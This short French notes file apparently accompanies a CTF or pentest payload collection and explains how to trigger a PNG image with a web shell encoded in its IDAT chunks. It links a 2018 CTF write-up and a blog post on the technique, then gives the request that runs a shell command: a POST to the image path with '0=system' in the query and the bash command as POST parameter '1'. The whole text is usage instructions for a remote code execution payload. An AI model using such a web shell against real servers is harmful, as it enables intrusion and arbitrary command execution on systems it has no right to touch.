# Notes

- Pour utiliser le payload `idat_rce_GET0_POST1.png` :

  - https://www.aperikube.fr/docs/ndhquals_2018/pixeditor/

  - https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

  - Faire la requête suivante :

    ```
    POST /image/path?0=system
    
    1=commande_bash (paramètres POST)

